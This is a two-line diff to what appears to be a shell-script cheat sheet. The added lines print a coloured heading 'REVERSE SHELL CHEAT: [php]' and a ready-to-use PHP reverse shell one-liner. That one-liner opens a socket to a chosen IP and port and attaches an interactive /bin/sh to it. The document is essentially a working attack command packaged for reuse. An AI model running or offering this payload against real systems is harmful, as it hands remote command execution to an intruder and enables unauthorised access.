@@ -1,0 +1,2 @@
+echo -e "\033[31m\033[1mREVERSE SHELL CHEAT: [php]\033[m"
+echo -e "\t\033[1mphp -r '"'$sock'"=fsockopen(\"$IP\","$PORT");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
